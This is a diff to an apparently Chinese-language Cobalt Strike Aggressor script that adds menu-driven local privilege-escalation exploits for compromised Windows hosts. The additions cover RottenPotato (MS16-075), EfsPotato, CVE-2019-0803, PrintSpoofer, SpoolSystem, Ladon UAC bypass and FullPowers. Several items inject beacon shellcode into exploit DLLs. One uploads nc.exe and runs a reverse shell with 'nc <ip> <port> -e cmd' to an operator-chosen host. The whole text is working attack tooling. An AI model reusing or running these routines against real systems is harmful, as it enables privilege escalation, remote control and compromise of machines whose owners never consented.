@@ -2,7 +2,9 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
@@ -28,6 +30,12 @@ foreach $file (@aggressor){
 sub Watson {
 	bexecute_assembly($bid, script_resource("/script/Watson.exe"), "");
 }
+
+		item "GetSystem" {
+        binput($1,"getsystem");
+        bgetsystem($1);
+    }
+	
             item "SweetPotato"{
                 $bid = $1['@'];
                 $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
@@ -79,6 +87,55 @@ sub juicypotato {
     
     bstage($bid, $null, $3['listener'], $arch);
 }
+
+            item "RottenPotato"{
+                $bid = $1['@'];
+                $Dialog = dialog("RottenPotato",%(bid => $bid),&RottenPotato);
+                dialog_description($Dialog, "MS16-075");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub RottenPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via RottenPotato (ms16-075)");
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = "x64.dll";
+    } else {
+        $arch = "x86";
+        $dll = "x86.dll";
+    }
+    $stager = shellcode($3['listener'], false, $arch);
+    bdllspawn($bid, script_resource("/script/RottenPotato/".$dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    beacon_link($bid, $null, $3['listener']);
+}
+
+            item "EfsPotato"{
+                $bid = $1['@'];
+                $Dialog = dialog("EfsPotato",%(bid => $bid),&EfsPotato);
+                dialog_description($Dialog, "EfsPotato");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub EfsPotato {
+	local('$shellcode $arch $program $exe $parm');
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " EfsPotato");
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+	} else {
+        $arch = "x86";
+	}
+	$program = "c:\\windows\\system32\\werfault.exe";
+	$exe = script_resource("/script/EfsPotato.exe");
+	$shellcode = base64_encode(artifact_payload($3['listener'], "raw", $arch));
+	$parm = "-l 6363 "."-p $program "."-s $shellcode";
+    bexecute_assembly!($bid, $exe, $parm);
+	beacon_link($bid, $null, $3['listener']);
+}
+
 
             item "MS14-058"{
                 $bid = $1['@'];
@@ -202,6 +259,29 @@ sub ms16_135_exploit {
 	bstage($bid, $null, $3['listener']);
 
 }
+
+        item "CVE-2019-0803"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2019-0803",%(bid => $bid),&cve_2019_0803);
+            dialog_description($Dialog, "Win32k特权提升漏洞。");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "运行");
+            dialog_show($Dialog);
+        }
+
+sub cve_2019_0803{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via cve-2019-0803");
+    local('$payload $fname');
+    $fname = Getname().".cmd";
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, script_resource("/script/0803.exe"));
+    bupload!($bid, $fname);
+    bshell!($bid,"0803.exe cmd  $+ \"$fname\"");
+}
+
             item "CVE-2020-0796"{
                 $bid = $1['@'];
                 $Dialog = dialog("cve_2020_0796_exploit",%(bid => $bid),&cve_2020_0796_exploit);
@@ -230,10 +310,12 @@ sub cve_2020_0796_exploit {
 
 	$stager = pack("I-", strlen($stager)) . $stager;
 
-	bdllspawn!($bid, getFileProper(script_resource("modules"), "/script/CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
+	bdllspawn!($bid, getFileProper(script_resource("script"), "/CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
 
 	beacon_link($bid, $null, $3['listener']);
 }
+
+
 			item "BypassUAC"{
 				$bid = $1;
 				$dialog = dialog("BypassUAC", %(cmd => "VALUE Base64 encoded command to execute",type => "eventvwr",bid => $bid), &BypassUAC);
@@ -246,6 +328,149 @@ sub cve_2020_0796_exploit {
 sub BypassUAC {
 	$arg = join(' ', @("-b",$3['type'],"-e",$3['cmd']));
 	bexecute_assembly($bid, script_resource("/script/SharpBypassUAC.exe"), $arg);
+}
+menu "SpoolSystem"{
+
+item "SpoolSystem Inject"{
+
+			local('$bid');
+				foreach $bid ($1){
+					spoolinj($bid);
+				}
+
+
+}
+item "SpoolSystem Spawn"{
+
+			local('$bid');
+				foreach $bid ($1){
+					spoolspawn($bid);
+					}
+
+
+}
+}
+sub spoolinj{
+fireAlias($1, "spoolsystem", "inject");
+}
+
+
+sub spoolspawn{
+fireAlias($1, "spoolsystem", "spawn");
+}
+
+		menu "Ladon" {
+			item "bypassuac"{
+				$bid = $1;
+				$dialog = dialog("bypassuac", %(filepath => "C:\\Windows\\Temp\\123.exe",bid => $bid), &bypassuac_ladon);
+				dialog_description($dialog, "BypassUac");
+				drow_text($dialog, "filepath", "filepath:  ");				
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub bypassuac_ladon {
+	$arg = join(' ', @("BypassUac",$3['filepath']));
+	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
+}
+
+			item "GetSystem"{
+				$bid = $1;
+				$dialog = dialog("GetSystem", %(filepath => "C:\\windows\\temp\\123.exe",bid => $bid), &GetSystem_ladon);
+				dialog_description($dialog, "GetSystem");
+				drow_text($dialog, "filepath", "filepath:  ");				
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub GetSystem_ladon {
+	$arg = join(' ', @("GetSystem",$3['filepath']));
+	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
+}
+}
+
+	    menu "PrintSpoofer" {
+		menu "NC反弹" {
+			item "上传PrintSpoofer和nc" {
+				$bid = $1;
+				$dialog = dialog("上传PrintSpoofer", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PrintSpoofer_upload);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub PrintSpoofer_upload {
+
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/script/x64/PrintSpoofer.exe"));
+		bupload($bid, script_resource("/script/x64/nc.exe"));
+    }else{
+        bupload($bid, script_resource("/script/x86/PrintSpoofer.exe"));
+		bupload($bid, script_resource("/script/x64/nc.exe"));
+    }
+
+}
+
+                item "NC反弹"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("NC反弹",%(NCpath => "c:\\windows\\temp\\nc.exe",NCip => "8.8.8.8",NCport => "8888",bid => $bid),&PrintSpoofer_nc);
+                    dialog_description($Dialog, "nc -l -p 8888");
+					drow_text($Dialog, "NCpath", "NC路径: ");
+                    drow_text($Dialog, "NCip", "NC监听IP: ");
+                    drow_text($Dialog, "NCport", "NC监听端口: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub PrintSpoofer_nc{
+    local('$NCpath $NCip $NCport');
+    $NCpath = $3['NCpath'];
+    $NCip = $3['NCip'];
+	$NCport = $3['NCport'];
+	bshell($bid, "PrintSpoofer.exe -c \" $+ $NCpath  $+ $NCip  $+ $NCport -e cmd\" ");
+}
+}
+
+            item "CS反弹"{
+                $bid = $1['@'];
+                $Dialog = dialog("PrintSpoofer",%(bid => $bid),&PrintSpoofer_dll);
+                dialog_description($Dialog, "PrintSpoofer");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub PrintSpoofer_dll {
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " PrintSpoofer");
+    
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+        $dll = script_resource("/script/x64/PrintSpoofer.dll");
+    } else {
+        $arch = "x86";
+        $dll = script_resource("/script/x86/PrintSpoofer.dll");
+    }
+
+    $stager = shellcode($3['listener'], false, $arch);
+
+    bdllspawn!($bid, $dll, $stager, "PrintSpoofer", 5000);
+    
+    bstage($bid, $null, $3['listener'], $arch);
+}
+
+}
+            item "FullPowers"{
+                $bid = $1['@'];
+                $Dialog = dialog("FullPowers",%(bid => $bid),&FullPowers_dll);
+                dialog_description($Dialog, "FullPowers");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub FullPowers_dll {
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " FullPowers");
+    $dll = script_resource("/script/FullPowers.dll");
+    $stager = shellcode($3['listener'], false, $arch);
+    bdllspawn!($bid, $dll, $stager, "FullPowers", 5000);   
+    bstage($bid, $null, $3['listener'], $arch);
 }
 
 	}
